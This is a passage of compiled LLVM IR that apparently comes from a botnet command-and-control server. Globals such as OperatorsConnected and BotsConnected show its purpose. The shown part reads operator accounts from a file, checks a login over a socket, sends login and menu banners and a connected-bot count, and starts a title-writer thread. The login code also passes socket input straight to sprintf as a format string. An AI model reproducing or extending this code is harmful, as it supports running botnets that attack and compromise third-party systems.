  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca i32, align 4
  %55 = alloca [2048 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca [2048 x i8], align 16
  %58 = alloca i8, align 1
  %59 = alloca i8, align 1
  %60 = alloca i8, align 1
  %61 = alloca i8, align 1
  %62 = alloca [2048 x i8], align 16
  %63 = alloca [2048 x i8], align 16
  %64 = alloca i8, align 1
  %65 = alloca i8, align 1
  %66 = alloca i8, align 1
  %67 = alloca i8, align 1
  %68 = alloca [2048 x i8], align 16
  %69 = alloca [2048 x i8], align 16
  %70 = alloca i8, align 1
  %71 = alloca i8, align 1
  %72 = alloca i8, align 1
  %73 = alloca i8, align 1
  %74 = alloca [80 x i8], align 16
  %75 = alloca [80 x i8], align 16
  %76 = alloca [80 x i8], align 16
  %77 = alloca [80 x i8], align 16
  %78 = alloca [80 x i8], align 16
  %79 = alloca [80 x i8], align 16
  %80 = alloca [80 x i8], align 16
  %81 = alloca [80 x i8], align 16
  %82 = alloca [80 x i8], align 16
  %83 = alloca [80 x i8], align 16
  %84 = alloca [80 x i8], align 16
  %85 = alloca [80 x i8], align 16
  %86 = alloca [80 x i8], align 16
  %87 = alloca [80 x i8], align 16
  %88 = alloca [80 x i8], align 16
  %89 = alloca [80 x i8], align 16
  %90 = alloca [80 x i8], align 16
  %91 = alloca [80 x i8], align 16
  %92 = alloca [80 x i8], align 16
  %93 = alloca [80 x i8], align 16
  %94 = alloca [80 x i8], align 16
  %95 = alloca [80 x i8], align 16
  %96 = alloca [80 x i8], align 16
  %97 = alloca [80 x i8], align 16
  %98 = alloca [80 x i8], align 16
  %99 = alloca [80 x i8], align 16
  %100 = alloca [2048 x i8], align 16
  %101 = alloca [2048 x i8], align 16
  %102 = alloca [2048 x i8], align 16
  %103 = alloca [2048 x i8], align 16
  %104 = alloca %struct._IO_FILE*, align 8
  %105 = alloca i64, align 8
  %106 = alloca %struct.tm*, align 8
  %107 = alloca [50 x i8], align 16
  %108 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %109 = load i8*, i8** %3, align 8
  %110 = ptrtoint i8* %109 to i32
  store i32 %110, i32* %4, align 4
  %111 = load volatile i32, i32* @OperatorsConnected, align 4
  %112 = add nsw i32 %111, 1
  store volatile i32 %112, i32* @OperatorsConnected, align 4
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %113, i8 0, i64 2048, i1 false)
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %114, i8 0, i64 2048, i1 false)
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %115, i8 0, i64 2048, i1 false)
  %116 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %116, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %117 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0))
  store %struct._IO_FILE* %117, %struct._IO_FILE** %13, align 8
  br label %118

118:                                              ; preds = %123, %1
  %119 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %120 = call i32 @feof(%struct._IO_FILE* %119) #9
  %121 = icmp ne i32 %120, 0
  %122 = xor i1 %121, true
  br i1 %122, label %123, label %128

123:                                              ; preds = %118
  %124 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %125 = call i32 @fgetc(%struct._IO_FILE* %124)
  store i32 %125, i32* %15, align 4
  %126 = load i32, i32* %14, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %14, align 4
  br label %118, !llvm.loop !17

128:                                              ; preds = %118
  store i32 0, i32* %16, align 4
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %129)
  br label %130

130:                                              ; preds = %135, %128
  %131 = load i32, i32* %16, align 4
  %132 = load i32, i32* %14, align 4
  %133 = sub nsw i32 %132, 1
  %134 = icmp ne i32 %131, %133
  br i1 %134, label %135, label %150

135:                                              ; preds = %130
  %136 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %137 = load i32, i32* %16, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.login_info, %struct.login_info* %139, i32 0, i32 0
  %141 = getelementptr inbounds [20 x i8], [20 x i8]* %140, i64 0, i64 0
  %142 = load i32, i32* %16, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %143
  %145 = getelementptr inbounds %struct.login_info, %struct.login_info* %144, i32 0, i32 1
  %146 = getelementptr inbounds [20 x i8], [20 x i8]* %145, i64 0, i64 0
  %147 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %136, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i8* %141, i8* %146)
  %148 = load i32, i32* %16, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %16, align 4
  br label %130, !llvm.loop !18

150:                                              ; preds = %130
  %151 = load i32, i32* %4, align 4
  %152 = call i64 @send(i32 %151, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.22, i64 0, i64 0), i64 22, i32 16384)
  %153 = icmp eq i64 %152, -1
  br i1 %153, label %154, label %155

154:                                              ; preds = %150
  br label %1555

155:                                              ; preds = %150
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %157 = load i32, i32* %4, align 4
  %158 = call i32 @fdgets(i8* %156, i32 2048, i32 %157)
  %159 = icmp slt i32 %158, 1
  br i1 %159, label %160, label %161

160:                                              ; preds = %155
  br label %1555

161:                                              ; preds = %155
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %162)
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.login_info, %struct.login_info* %165, i32 0, i32 0
  %167 = getelementptr inbounds [20 x i8], [20 x i8]* %166, i64 0, i64 0
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %169 = call i32 (i8*, i8*, ...) @sprintf(i8* %167, i8* %168) #9
  %170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %170, i8** %17, align 8
  %171 = load i8*, i8** %17, align 8
  %172 = call i32 @Find_Login(i8* %171)
  store i32 %172, i32* %5, align 4
  %173 = load i8*, i8** %17, align 8
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.login_info, %struct.login_info* %176, i32 0, i32 0
  %178 = getelementptr inbounds [20 x i8], [20 x i8]* %177, i64 0, i64 0
  %179 = call i32 @strcmp(i8* %173, i8* %178) #8
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %181, label %205

181:                                              ; preds = %161
  %182 = load i32, i32* %4, align 4
  %183 = call i64 @send(i32 %182, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.24, i64 0, i64 0), i64 22, i32 16384)
  %184 = icmp eq i64 %183, -1
  br i1 %184, label %185, label %186

185:                                              ; preds = %181
  br label %1555

186:                                              ; preds = %181
  %187 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %188 = load i32, i32* %4, align 4
  %189 = call i32 @fdgets(i8* %187, i32 2048, i32 %188)
  %190 = icmp slt i32 %189, 1
  br i1 %190, label %191, label %192

191:                                              ; preds = %186
  br label %1555

192:                                              ; preds = %186
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %193)
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %196
  %198 = getelementptr inbounds %struct.login_info, %struct.login_info* %197, i32 0, i32 1
  %199 = getelementptr inbounds [20 x i8], [20 x i8]* %198, i64 0, i64 0
  %200 = call i32 @strcmp(i8* %194, i8* %199) #8
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %202, label %203

202:                                              ; preds = %192
  br label %206

203:                                              ; preds = %192
  %204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %204, i8 0, i64 2048, i1 false)
  br label %393

205:                                              ; preds = %161
  br label %206

206:                                              ; preds = %205, %202
  %207 = load i32, i32* %4, align 4
  %208 = call i64 @send(i32 %207, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i64 5, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %206
  br label %1555

211:                                              ; preds = %206
  %212 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %213 = call i32 (i8*, i8*, ...) @sprintf(i8* %212, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.26, i64 0, i64 0)) #9
  %214 = getelementptr inbounds [80 x i8], [80 x i8]* %20, i64 0, i64 0
  %215 = call i32 (i8*, i8*, ...) @sprintf(i8* %214, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.27, i64 0, i64 0)) #9
  %216 = getelementptr inbounds [80 x i8], [80 x i8]* %21, i64 0, i64 0
  %217 = call i32 (i8*, i8*, ...) @sprintf(i8* %216, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.28, i64 0, i64 0)) #9
  %218 = getelementptr inbounds [80 x i8], [80 x i8]* %22, i64 0, i64 0
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* %218, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.29, i64 0, i64 0)) #9
  %220 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %221 = call i32 (i8*, i8*, ...) @sprintf(i8* %220, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.29, i64 0, i64 0)) #9
  %222 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %223 = call i32 (i8*, i8*, ...) @sprintf(i8* %222, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.30, i64 0, i64 0)) #9
  %224 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %224, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.31, i64 0, i64 0)) #9
  %226 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %227 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.32, i64 0, i64 0)) #9
  %228 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %229 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i64 0, i64 0)) #9
  %230 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %231 = call i32 (i8*, i8*, ...) @sprintf(i8* %230, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.34, i64 0, i64 0)) #9
  %232 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %233 = call i32 (i8*, i8*, ...) @sprintf(i8* %232, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.35, i64 0, i64 0)) #9
  %234 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %235 = call i32 (i8*, i8*, ...) @sprintf(i8* %234, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.36, i64 0, i64 0)) #9
  %236 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %237 = call i32 (i8*, i8*, ...) @sprintf(i8* %236, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.37, i64 0, i64 0)) #9
  %238 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %239 = call i32 (i8*, i8*, ...) @sprintf(i8* %238, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.38, i64 0, i64 0)) #9
  %240 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %241 = call i32 (i8*, i8*, ...) @sprintf(i8* %240, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.39, i64 0, i64 0)) #9
  %242 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %243 = call i32 (i8*, i8*, ...) @sprintf(i8* %242, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.40, i64 0, i64 0)) #9
  %244 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %245 = call i32 (i8*, i8*, ...) @sprintf(i8* %244, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.41, i64 0, i64 0)) #9
  %246 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %247 = call i32 (i8*, i8*, ...) @sprintf(i8* %246, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i64 0, i64 0)) #9
  %248 = load i32, i32* %4, align 4
  %249 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %250 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %251 = call i64 @strlen(i8* %250) #8
  %252 = call i64 @send(i32 %248, i8* %249, i64 %251, i32 16384)
  %253 = icmp eq i64 %252, -1
  br i1 %253, label %254, label %255

254:                                              ; preds = %211
  br label %1555

255:                                              ; preds = %211
  %256 = load i32, i32* %4, align 4
  %257 = getelementptr inbounds [80 x i8], [80 x i8]* %20, i64 0, i64 0
  %258 = getelementptr inbounds [80 x i8], [80 x i8]* %20, i64 0, i64 0
  %259 = call i64 @strlen(i8* %258) #8
  %260 = call i64 @send(i32 %256, i8* %257, i64 %259, i32 16384)
  %261 = icmp eq i64 %260, -1
  br i1 %261, label %262, label %263

262:                                              ; preds = %255
  br label %1555

263:                                              ; preds = %255
  %264 = load i32, i32* %4, align 4
  %265 = getelementptr inbounds [80 x i8], [80 x i8]* %21, i64 0, i64 0
  %266 = getelementptr inbounds [80 x i8], [80 x i8]* %21, i64 0, i64 0
  %267 = call i64 @strlen(i8* %266) #8
  %268 = call i64 @send(i32 %264, i8* %265, i64 %267, i32 16384)
  %269 = icmp eq i64 %268, -1
  br i1 %269, label %270, label %271

270:                                              ; preds = %263
  br label %1555

271:                                              ; preds = %263
  %272 = load i32, i32* %4, align 4
  %273 = getelementptr inbounds [80 x i8], [80 x i8]* %22, i64 0, i64 0
  %274 = getelementptr inbounds [80 x i8], [80 x i8]* %22, i64 0, i64 0
  %275 = call i64 @strlen(i8* %274) #8
  %276 = call i64 @send(i32 %272, i8* %273, i64 %275, i32 16384)
  %277 = icmp eq i64 %276, -1
  br i1 %277, label %278, label %279

278:                                              ; preds = %271
  br label %1555

279:                                              ; preds = %271
  %280 = load i32, i32* %4, align 4
  %281 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %282 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %283 = call i64 @strlen(i8* %282) #8
  %284 = call i64 @send(i32 %280, i8* %281, i64 %283, i32 16384)
  %285 = icmp eq i64 %284, -1
  br i1 %285, label %286, label %287

286:                                              ; preds = %279
  br label %1555

287:                                              ; preds = %279
  %288 = load i32, i32* %4, align 4
  %289 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %290 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %291 = call i64 @strlen(i8* %290) #8
  %292 = call i64 @send(i32 %288, i8* %289, i64 %291, i32 16384)
  %293 = icmp eq i64 %292, -1
  br i1 %293, label %294, label %295

294:                                              ; preds = %287
  br label %1555

295:                                              ; preds = %287
  %296 = load i32, i32* %4, align 4
  %297 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %298 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %299 = call i64 @strlen(i8* %298) #8
  %300 = call i64 @send(i32 %296, i8* %297, i64 %299, i32 16384)
  %301 = icmp eq i64 %300, -1
  br i1 %301, label %302, label %303

302:                                              ; preds = %295
  br label %1555

303:                                              ; preds = %295
  %304 = load i32, i32* %4, align 4
  %305 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %306 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %307 = call i64 @strlen(i8* %306) #8
  %308 = call i64 @send(i32 %304, i8* %305, i64 %307, i32 16384)
  %309 = icmp eq i64 %308, -1
  br i1 %309, label %310, label %311

310:                                              ; preds = %303
  br label %1555

311:                                              ; preds = %303
  %312 = load i32, i32* %4, align 4
  %313 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %314 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %315 = call i64 @strlen(i8* %314) #8
  %316 = call i64 @send(i32 %312, i8* %313, i64 %315, i32 16384)
  %317 = icmp eq i64 %316, -1
  br i1 %317, label %318, label %319

318:                                              ; preds = %311
  br label %1555

319:                                              ; preds = %311
  %320 = load i32, i32* %4, align 4
  %321 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %322 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %323 = call i64 @strlen(i8* %322) #8
  %324 = call i64 @send(i32 %320, i8* %321, i64 %323, i32 16384)
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %326, label %327

326:                                              ; preds = %319
  br label %1555

327:                                              ; preds = %319
  %328 = load i32, i32* %4, align 4
  %329 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %330 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %331 = call i64 @strlen(i8* %330) #8
  %332 = call i64 @send(i32 %328, i8* %329, i64 %331, i32 16384)
  %333 = icmp eq i64 %332, -1
  br i1 %333, label %334, label %335

334:                                              ; preds = %327
  br label %1555

335:                                              ; preds = %327
  %336 = load i32, i32* %4, align 4
  %337 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %338 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %339 = call i64 @strlen(i8* %338) #8
  %340 = call i64 @send(i32 %336, i8* %337, i64 %339, i32 16384)
  %341 = icmp eq i64 %340, -1
  br i1 %341, label %342, label %343

342:                                              ; preds = %335
  br label %1555

343:                                              ; preds = %335
  %344 = load i32, i32* %4, align 4
  %345 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %346 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %347 = call i64 @strlen(i8* %346) #8
  %348 = call i64 @send(i32 %344, i8* %345, i64 %347, i32 16384)
  %349 = icmp eq i64 %348, -1
  br i1 %349, label %350, label %351

350:                                              ; preds = %343
  br label %1555

351:                                              ; preds = %343
  %352 = load i32, i32* %4, align 4
  %353 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %354 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %355 = call i64 @strlen(i8* %354) #8
  %356 = call i64 @send(i32 %352, i8* %353, i64 %355, i32 16384)
  %357 = icmp eq i64 %356, -1
  br i1 %357, label %358, label %359

358:                                              ; preds = %351
  br label %1555

359:                                              ; preds = %351
  %360 = load i32, i32* %4, align 4
  %361 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %362 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %363 = call i64 @strlen(i8* %362) #8
  %364 = call i64 @send(i32 %360, i8* %361, i64 %363, i32 16384)
  %365 = icmp eq i64 %364, -1
  br i1 %365, label %366, label %367

366:                                              ; preds = %359
  br label %1555

367:                                              ; preds = %359
  %368 = load i32, i32* %4, align 4
  %369 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %370 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %371 = call i64 @strlen(i8* %370) #8
  %372 = call i64 @send(i32 %368, i8* %369, i64 %371, i32 16384)
  %373 = icmp eq i64 %372, -1
  br i1 %373, label %374, label %375

374:                                              ; preds = %367
  br label %1555

375:                                              ; preds = %367
  %376 = load i32, i32* %4, align 4
  %377 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %378 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %379 = call i64 @strlen(i8* %378) #8
  %380 = call i64 @send(i32 %376, i8* %377, i64 %379, i32 16384)
  %381 = icmp eq i64 %380, -1
  br i1 %381, label %382, label %383

382:                                              ; preds = %375
  br label %1555

383:                                              ; preds = %375
  %384 = load i32, i32* %4, align 4
  %385 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %386 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %387 = call i64 @strlen(i8* %386) #8
  %388 = call i64 @send(i32 %384, i8* %385, i64 %387, i32 16384)
  %389 = icmp eq i64 %388, -1
  br i1 %389, label %390, label %391

390:                                              ; preds = %383
  br label %1555

391:                                              ; preds = %383
  %392 = call i32 @sleep(i32 5)
  br label %1555

393:                                              ; preds = %203
  %394 = load i8*, i8** %3, align 8
  %395 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %394) #9
  %396 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %396, i8 0, i64 2048, i1 false)
  %397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %398 = call i32 (i8*, i8*, ...) @sprintf(i8* %397, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.43, i64 0, i64 0)) #9
  %399 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %400 = call i32 (i8*, i8*, ...) @sprintf(i8* %399, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.44, i64 0, i64 0)) #9
  %401 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %402 = call i32 (i8*, i8*, ...) @sprintf(i8* %401, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i64 0, i64 0)) #9
  %403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %404 = call i32 (i8*, i8*, ...) @sprintf(i8* %403, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.46, i64 0, i64 0)) #9
  %405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %406 = call i32 (i8*, i8*, ...) @sprintf(i8* %405, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.47, i64 0, i64 0)) #9
  %407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %408 = call i32 (i8*, i8*, ...) @sprintf(i8* %407, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.48, i64 0, i64 0)) #9
  %409 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %410 = call i32 (i8*, i8*, ...) @sprintf(i8* %409, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.49, i64 0, i64 0)) #9
  %411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %412 = call i32 (i8*, i8*, ...) @sprintf(i8* %411, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.50, i64 0, i64 0)) #9
  %413 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %414 = call i32 (i8*, i8*, ...) @sprintf(i8* %413, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.51, i64 0, i64 0)) #9
  %415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %416 = call i32 (i8*, i8*, ...) @sprintf(i8* %415, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i64 0, i64 0)) #9
  %417 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %418 = call i32 (i8*, i8*, ...) @sprintf(i8* %417, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.53, i64 0, i64 0)) #9
  %419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %420 = call i32 (i8*, i8*, ...) @sprintf(i8* %419, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.54, i64 0, i64 0)) #9
  %421 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %422 = call i32 (i8*, i8*, ...) @sprintf(i8* %421, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.55, i64 0, i64 0)) #9
  %423 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %424 = call i32 (i8*, i8*, ...) @sprintf(i8* %423, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.56, i64 0, i64 0)) #9
  %425 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %426 = call i32 @BotsConnected()
  %427 = load i32, i32* %5, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %428
  %430 = getelementptr inbounds %struct.login_info, %struct.login_info* %429, i32 0, i32 0
  %431 = getelementptr inbounds [20 x i8], [20 x i8]* %430, i64 0, i64 0
  %432 = load volatile i32, i32* @OperatorsConnected, align 4
  %433 = call i32 (i8*, i8*, ...) @sprintf(i8* %425, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.57, i64 0, i64 0), i32 %426, i8* %431, i32 %432) #9
  %434 = load i32, i32* %4, align 4
  %435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %436 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %437 = call i64 @strlen(i8* %436) #8
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %440, label %441

440:                                              ; preds = %393
  br label %1555

441:                                              ; preds = %393
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %444 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %441
  br label %1555

449:                                              ; preds = %441
  %450 = load i32, i32* %4, align 4
  %451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %452 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %453 = call i64 @strlen(i8* %452) #8
  %454 = call i64 @send(i32 %450, i8* %451, i64 %453, i32 16384)
  %455 = icmp eq i64 %454, -1
  br i1 %455, label %456, label %457

456:                                              ; preds = %449
  br label %1555

457:                                              ; preds = %449
  %458 = load i32, i32* %4, align 4
  %459 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %460 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %461 = call i64 @strlen(i8* %460) #8
  %462 = call i64 @send(i32 %458, i8* %459, i64 %461, i32 16384)
  %463 = icmp eq i64 %462, -1
  br i1 %463, label %464, label %465

464:                                              ; preds = %457
  br label %1555

465:                                              ; preds = %457
  %466 = load i32, i32* %4, align 4
  %467 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %468 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %469 = call i64 @strlen(i8* %468) #8
